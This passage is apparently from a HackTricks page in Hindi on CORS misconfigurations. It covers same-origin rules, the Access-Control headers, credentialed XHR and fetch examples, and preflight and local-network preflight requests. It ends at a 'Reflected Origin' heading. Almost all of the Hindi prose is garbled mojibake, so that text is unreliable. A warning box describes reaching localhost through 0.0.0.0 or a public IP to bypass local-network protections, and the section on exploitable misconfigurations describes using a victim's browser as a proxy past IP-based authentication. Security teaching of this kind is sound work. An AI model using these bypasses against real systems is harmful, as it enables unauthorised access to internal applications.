# CORS - рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдФрд░ рдмрд╛рдИрдкрд╛рд╕

<details>

<summary><strong> AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╢реЗрдпрд░ рдХрд░реЗрдВред

</details>

## CORS рдХреНрдпрд╛ рд╣реИ?

CORS (Cross-origin resource sharing) рдорд╛рдирдХ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдХрд┐ рдХреМрди рдЙрд╕рдХреА рд╕рдВрдкрддреНрддрд┐рдпреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ рдмрд╛рд╣рд░реА рд╕рдВрд╕рд╛рдзрдиреЛрдВ рд╕реЗ рдХреМрди рд╕реА **HTTP рдЕрдиреБрд░реЛрдз рд╡рд┐рдзрд┐рдпрд╛рдБ рдЕрдиреБрдордд рд╣реИрдВ**ред

рдПрдХ **рд╕рдорд╛рди-рдореВрд▓** рдиреАрддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдХрд┐ рджреЛрдиреЛрдВ **рд╕рд░реНрд╡рд░ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рд╡рд╛рд▓реЗ** рдПрдХ рд╕рдВрд╕рд╛рдзрди рдФрд░ рд╕рд░реНрд╡рд░ рдЬрд╣рд╛рдБ **рд╕рдВрд╕рд╛рдзрди** рд╕реНрдерд┐рдд рд╣реИ рдЙрд╕реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ ([http://),рдбреЛрдореЗрди](http://\),рдбреЛрдореЗрди) рдирд╛рдо (internal-web.com) рдФрд░ рдЙрд╕реА **рдкреЛрд░реНрдЯ** (80) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рдлрд┐рд░, рдпрджрд┐ рд╕рд░реНрд╡рд░ рд╕рдорд╛рди-рдореВрд▓ рдиреАрддрд┐ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдХреЗрд╡рд▓ рдЙрд╕реА рдбреЛрдореЗрди рдФрд░ рдкреЛрд░реНрдЯ рд╕реЗ рд╡реЗрдм рдкреЗрдЬ рд╣реА рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХреЗрдВрдЧреЗред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд╛рд▓рд┐рдХрд╛ рджрд┐рдЦрд╛рддреА рд╣реИ рдХрд┐ `http://normal-website.com/example/example.html` рдореЗрдВ рд╕рдорд╛рди-рдореВрд▓ рдиреАрддрд┐ рдХреИрд╕реЗ рд▓рд╛рдЧреВ рд╣реЛрдЧреА :

| URL рдкрд╣реБрдБрдЪрд╛                              | рдкрд╣реБрдБрдЪ рдЕрдиреБрдорддрд┐?                  |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | рд╣рд╛рдБ: рд╕рдорд╛рди рдпреЛрдЬрдирд╛, рдбреЛрдореЗрди, рдФрд░ рдкреЛрд░реНрдЯ |
| `http://normal-website.com/example2/`     | рд╣рд╛рдБ: рд╕рдорд╛рди рдпреЛрдЬрдирд╛, рдбреЛрдореЗрди, рдФрд░ рдкреЛрд░реНрдЯ |
| `https://normal-website.com/example/`     | рдирд╣реАрдВ: рдЕрд▓рдЧ рдпреЛрдЬрдирд╛ рдФрд░ рдкреЛрд░реНрдЯ      |
| `http://en.normal-website.com/example/`   | рдирд╣реАрдВ: рдЕрд▓рдЧ рдбреЛрдореЗрди               |
| `http://www.normal-website.com/example/`  | рдирд╣реАрдВ: рдЕрд▓рдЧ рдбреЛрдореЗрди               |
| `http://normal-website.com:8080/example/` | рдирд╣реАрдВ: рдЕрд▓рдЧ рдкреЛрд░реНрдЯ\*               |

\*_Internet Explorer рдЗрд╕ рдкрд╣реБрдБрдЪ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ IE рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рдирд╣реАрдВ рд░рдЦрддрд╛ рдЬрдм рд╕рдорд╛рди-рдореВрд▓ рдиреАрддрд┐ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИред_

### `Access-Control-Allow-Origin` рд╣реЗрдбрд░

`Access-Control-Allow-Origin` рдХреА рд╡рд┐рд╢рд┐рд╖реНрдЯрддрд╛ **рдмрд╣реБ-рдореВрд▓реЛрдВ** рдХреЗ рд▓рд┐рдП, рдпрд╛ рдорд╛рди **`null`**, рдпрд╛ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб **`*`** рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдХреЛрдИ рднреА рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдмрд╣реБ-рдореВрд▓реЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛** рдФрд░ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб `*` рдХреЗ рдЙрдкрдпреЛрдЧ рдкрд░ **рдкреНрд░рддрд┐рдмрдВрдз** рд╣реИрдВред(_рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХреЗрд╡рд▓ рдЕрдХреЗрд▓реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣ рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛ `Access-Control-Allow-Origin: https://*.normal-website.com` рдФрд░ рдЗрд╕реЗ _Access-Control-Allow-Credentials: true_ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛_)

рдпрд╣ рд╣реЗрдбрд░ **рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд╡рд╛рдкрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдЬрдм рдПрдХ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рд╕рдВрд╕рд╛рдзрди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддреА рд╣реИ, рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рдЬреЛрдбрд╝реЗ рдЧрдП `Origin` рд╣реЗрдбрд░ рдХреЗ рд╕рд╛рдеред

### `Access-Control-Allow-Credentials` рд╣реЗрдбрд░

рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рдВрд╕рд╛рдзрди рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ** рд╡реНрдпрд╡рд╣рд╛рд░ рдХреБрдХреАрдЬрд╝ рдФрд░ Authorization рд╣реЗрдбрд░ рдЬреИрд╕реА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ рдмрд┐рдирд╛ **рдЕрдиреБрд░реЛрдзреЛрдВ** рдХреЛ **рдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рд╕рд░реНрд╡рд░ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ** рдЬрдм рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ **рдкрд╛рд╕ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ** рдЙрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ CORS **`Access-Control-Allow-Credentials`** рд╣реЗрдбрд░ рдХреЛ **`true`** рдкрд░ рд╕реЗрдЯ рдХрд░рдХреЗред

рдпрджрд┐ рдорд╛рди `true` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ (рдХреБрдХреАрдЬрд╝, рдЕрдзрд┐рдХрд╛рд░реАрдХрд░рдг рд╣реЗрдбрд░реНрд╕ рдпрд╛ TLS рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгрдкрддреНрд░) рднреЗрдЬреЗрдЧрд╛ред
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### рдкреНрд░реА-рдлреНрд▓рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдз

рдХреБрдЫ рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ, рдЬрдм рдПрдХ рдХреНрд░реЙрд╕-рдбреЛрдореЗрди рдЕрдиреБрд░реЛрдз:

* **рдЧреИрд░-рдорд╛рдирдХ HTTP рд╡рд┐рдзрд┐ (HEAD, GET, POST)** рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ
* рдирдП **рд╣реЗрдбрд░реНрд╕** рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ
* рд╡рд┐рд╢реЗрд╖ **Content-Type рд╣реЗрдбрд░ рдорд╛рди** рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ

{% hint style="info" %}
**рдЬрд╛рдВрдЪреЗрдВ** [**рдЗрд╕ рд▓рд┐рдВрдХ рдореЗрдВ**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) **рдХрд┐ рдПрдХ рдЕрдиреБрд░реЛрдз рдХреА рдХреНрдпрд╛ рд╢рд░реНрддреЗрдВ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рдкреНрд░реА-рдлреНрд▓рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рд╕реЗ рдмрдЪрд╛ рдЬрд╛ рд╕рдХреЗ**
{% endhint %}

рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЕрдиреБрд░реЛрдз рд╕реЗ рдкрд╣рд▓реЗ **`OPTIONS`** **рд╡рд┐рдзрд┐** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **рдЕрдиреБрд░реЛрдз** рд╣реЛрддрд╛ рд╣реИ, рдФрд░ CORS рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореЗрдВ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЕрдиреБрд░реЛрдз рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕реА **рд╡рд┐рдзрд┐рдпрд╛рдБ рдФрд░ рд╣реЗрдбрд░реНрд╕ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ**ред рдЗрд╕реЗ **рдкреНрд░реА-рдлреНрд▓рд╛рдЗрдЯ рдЬрд╛рдВрдЪ** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рд╕рд░реНрд╡рд░ **рдЕрдиреБрдордд рд╡рд┐рдзрд┐рдпреЛрдВ рдХреА рд╕реВрдЪреА рд▓реМрдЯрд╛рддрд╛ рд╣реИ** рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдУрд░рд┐рдЬрд┐рди** рдФрд░ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдпрд╣ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреА рд╡рд┐рдзрд┐ рдЕрдиреБрдордд рд╣реИред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдпрджрд┐ рдкреНрд░реА-рдлреНрд▓рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдз рдирд╣реАрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ "рд╕рд╛рдорд╛рдиреНрдп рдЕрдиреБрд░реЛрдз" рдХреА рд╢рд░реНрддреЗрдВ рдорд╛рдиреА рдЬрд╛рддреА рд╣реИрдВ, рддреЛ рднреА **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЕрдзрд┐рдХреГрдд рд╣реЗрдбрд░реНрд╕ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП** рдпрд╛ **рдмреНрд░рд╛рдЙрдЬрд╝рд░** **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкрдврд╝ рдирд╣реАрдВ рдкрд╛рдПрдЧрд╛** рдЕрдиреБрд░реЛрдз рдХреАред
{% endhint %}

**рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП**, рдпрд╣ рдПрдХ рдкреНрд░реА-рдлреНрд▓рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдз рд╣реИ рдЬреЛ **`PUT` рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдорд╛рдВрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ** рдПрдХ **рдХрд╕реНрдЯрдо** рдЕрдиреБрд░реЛрдз **рд╣реЗрдбрд░** рдХреЗ рд╕рд╛рде рдЬрд┐рд╕реЗ `Special-Request-Header` рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ:
```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```
рд╕рд░реНрд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕рд╛ рдкреНрд░рддрд┐рд╕рд╛рдж рд▓реМрдЯрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* `Access-Control-Allow-Headers` рдЕрдиреБрдорддрд┐ рдкреНрд░рд╛рдкреНрдд рд╣реЗрдбрд░реНрд╕
* `Access-Control-Expose-Headers`
* `Access-Control-Max-Age` рдкреНрд░реА-рдлреНрд▓рд╛рдЗрдЯ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХреИрд╢рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХрддрдо рд╕рдордп рд╕реАрдорд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ
* `Access-Control-Request-Headers` рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЕрдиреБрд░реЛрдз рдЬреЛ рд╣реЗрдбрд░ рднреЗрдЬрдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ
* `Access-Control-Request-Method` рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЕрдиреБрд░реЛрдз рдЬреЛ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ
* `Origin` рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЕрдиреБрд░реЛрдз рдХрд╛ рдореВрд▓ (рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╕реЗрдЯ)

![](../.gitbook/assets/preflight.svg)

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдорддреМрд░ рдкрд░ (рдХрдВрдЯреЗрдВрдЯ-рдЯрд╛рдЗрдк рдФрд░ рд╣реЗрдбрд░реНрд╕ рд╕реЗрдЯ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реБрдП) **GET/POST рдЕрдиреБрд░реЛрдз рдореЗрдВ рдХреЛрдИ рдкреНрд░реА-рдлреНрд▓рд╛рдЗрдЯ рдЕрдиреБрд░реЛрдз рдирд╣реАрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ** (рдЕрдиреБрд░реЛрдз **рд╕реАрдзреЗ** рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ), рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╣реЗрдбрд░реНрд╕/рдмреЙрдбреА** рддрдХ рдкрд╣реБрдБрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕рдореЗрдВ _Access-Control-Allow-Origin_ рд╣реЗрдбрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ рдЗрд╕реЗ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред\
**рдЗрд╕рд▓рд┐рдП, CORS CSRF рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░рддрд╛ (рд▓реЗрдХрд┐рди рдпрд╣ рд╕рд╣рд╛рдпрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ).**

### **Local Network Requests Pre-flight request**

рдЬрдм рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЛ рд▓реЛрдХрд▓ рдиреЗрдЯрд╡рд░реНрдХ IP рдкрддреЗ рдкрд░ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, 2 рдЕрддрд┐рд░рд┐рдХреНрдд CORS рд╣реЗрдбрд░реНрд╕ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ:

* `Access-Control-Request-Local-Network` рдХреНрд▓рд╛рдЗрдВрдЯ рдЕрдиреБрд░реЛрдз рд╣реЗрдбрд░ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЕрдиреБрд░реЛрдз рдПрдХ рд▓реЛрдХрд▓ рдиреЗрдЯрд╡рд░реНрдХ рдЕрдиреБрд░реЛрдз рд╣реИ
* `Access-Control-Allow-Local-Network` рд╕рд░реНрд╡рд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╕рдВрд╕рд╛рдзрди рдХреЛ рдмрд╛рд╣рд░реА рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд╕рд╛рде рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рд╕рд╛рдЭрд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ

**рд▓реЛрдХрд▓ рдиреЗрдЯрд╡рд░реНрдХ рдЕрдиреБрд░реЛрдз рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реА рд╡реИрдз рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдореЗрдВ рднреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╣реЗрдбрд░ `Access-Controls-Allow-Local_network: true` рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://public.example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ linux **0.0.0.0** IP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрди рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ **bypass** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ localhost рддрдХ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХреЗ рдХреНрдпреЛрдВрдХрд┐ рдЙрд╕ IP рдкрддреЗ рдХреЛ "рд╕реНрдерд╛рдиреАрдп" рдирд╣реАрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдпрджрд┐ рдЖрдк **рд╕реНрдерд╛рдиреАрдп endpoint рдХреЗ public IP рдкрддреЗ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (рдЬреИрд╕реЗ рдХрд┐ рд░рд╛рдЙрдЯрд░ рдХрд╛ public IP), рддреЛ **Local Network рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ bypass** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдХреНрдпреЛрдВрдХрд┐ рдХрдИ рдмрд╛рд░, рднрд▓реЗ рд╣реА **public IP** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реЛ, рдЕрдЧрд░ рдпрд╣ **рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗ рд╣реИ**, рддреЛ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдПрдЧреАред


{% endhint %}

## Exploitable misconfigurations

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЕрдзрд┐рдХрд╛рдВрд╢ **рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП `Access-Control-Allow-Credentials`** рдХреЛ **`true`** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рд╕реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рднреЗрдЬрдиреЗ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗрдЧреАред рдмрд┐рдирд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЗ, рдХрдИ рд╣рдорд▓реЗ рдЕрдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВ; рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдХреБрдХреАрдЬрд╝ рдкрд░ рд╕рд╡рд╛рд░реА рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ, рдЗрд╕рд▓рд┐рдП рдЕрдХреНрд╕рд░ рдЙрдирдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╕реЗ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп рдЦреБрдж рд╕реЗ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рд╕реЗ рдХреБрдЫ рднреА рд╣рд╛рд╕рд┐рд▓ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред

рдПрдХ рдЙрд▓реНрд▓реЗрдЦрдиреАрдп рдЕрдкрд╡рд╛рдж рддрдм рд╣реЛрддрд╛ рд╣реИ рдЬрдм **рдкреАрдбрд╝рд┐рдд рдХрд╛ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдерд╛рди рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред** рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░рдХреЗ IP-рдЖрдзрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ bypass рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрдВрдЯреНрд░рд╛рдиреЗрдЯ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдкреНрд░рднрд╛рд╡ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрд╣ DNS rebinding рдХреЗ рд╕рдорд╛рди рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рдмрд╣реБрдд рдХрдо рдЬрдЯрд┐рд▓ рд╣реИред

### Reflected `Origin` in `Access-Control-Allow-Origin`

